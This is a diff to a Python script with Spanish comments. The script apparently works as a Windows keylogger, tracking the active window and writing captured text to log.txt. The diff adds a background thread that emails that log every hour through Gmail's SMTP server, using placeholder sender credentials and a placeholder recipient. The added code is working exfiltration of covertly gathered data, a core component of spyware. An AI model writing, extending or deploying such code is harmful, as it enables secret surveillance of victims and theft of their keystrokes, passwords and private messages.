@@ -5,9 +5,83 @@ import platform
 import pygetwindow as gw
 import win32gui
 import win32process
+import smtplib
+import time
+import os
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import threading
 
+# Datos del correo
+correo_origen = "ficticio@gmail.com"
+contraseña = "contraseña_ficticia"
+correo_destino = "destinatario@example.com"
 log_filename = "log.txt"
+
+
+
 current_text = [] 
+
+
+# Configuración para correo con SMTP
+
+def enviar_correo():
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = correo_origen
+        msg['To'] = correo_destino
+        msg['Subject'] = f"Log enviado el {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+
+        cuerpo = 'Este es el log generado de forma automática'
+        msg.attach(MIMEText(cuerpo, 'plain'))
+
+        with open(log_filename, 'tb') as archivo_log:
+            parte = MIMEBase('aplication', 'octet-stream')
+            parte.set_payload(archivo_log.read())
+            encoders.encode_base64(parte)
+            parte.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(log_filename)}")
+            msg.attach(parte)
+
+            # Conectar con el servidor SMTP
+
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(correo_origen, contraseña)
+
+            # Enviar Correo 
+
+            texto = msg.as_string()
+            server.sendmail(correo_origen, correo_destino, texto)
+            server.quit()
+
+
+            print(f"Correo enviado exitosamente a {correo_destino} con el log adjunto.")
+    except Exception as e:
+            print(f"Error al enviar el correo: {e}")
+
+
+# Enviar el correo cada X horas
+
+def enviar_cada(intervalo_horas):
+    while True:
+        enviar_correo()
+        print(f"Esperando {intervalo_horas} horas para el siguiente envío...")
+        time.sleep(intervalo_horas * 3600) # Convierte las horas a segundos
+
+# Iniciar la función en un hilo que no bloquee el pprograma 
+
+def iniciar_envio_cada(intervalo_horas):
+    hilo_envio = threading.Thread(target=enviar_cada, args=(intervalo_horas,))
+    hilo_envio.daemon = True # Para que el ilo termine al cerrar el programa
+    hilo_envio.start()
+    
+# Inicia el envio cada x horas
+
+iniciar_envio_cada(1)
+
+
 
 # Función para obtener la aplicación activa
 
